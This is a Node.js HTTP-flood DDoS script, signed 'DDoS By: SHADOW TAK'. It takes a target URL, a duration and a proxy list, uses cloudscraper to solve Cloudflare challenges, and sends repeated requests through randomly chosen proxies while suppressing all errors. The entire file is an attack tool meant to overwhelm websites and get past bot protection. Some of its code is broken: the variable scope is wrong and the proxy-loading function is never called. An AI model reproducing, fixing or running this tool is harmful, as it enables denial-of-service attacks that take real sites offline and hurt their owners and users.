require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
colors = require('colors');
    CloudScraper = require('cloudscraper'),
    path = require('path');
if (process.argv.length !== 6) {
    console.log(colors.yellow(`
        Usage: node ${path.basename(__filename)} <http://example.com> <60> <150> <proxy.txt>`)
);
    process.exit(0);
}
const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];
function send_req_proxy(proxy) {

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return;
            }
            resolve(response.request.headers);
        });
    });
    getHeaders.then(function (result) {
         Object.keys(result).forEach(function (i, e) {
             console.log(colors.cyan("ATTACK PROXY"));
         });
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, function (error, response) {
                if (error) {
                     console.log(colors.red(error.message));
                }
            });
        }
    });
}
function proxx(){
    let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
    console.log(`
DDoS By: SHADOW TAK
    `)
    setInterval(() => {
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        send_req_proxy(proxy);
    });
}
setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);
process.on('uncaughtException', function (err) {
    
});
process.on('unhandledRejection', function (err) {
    
});
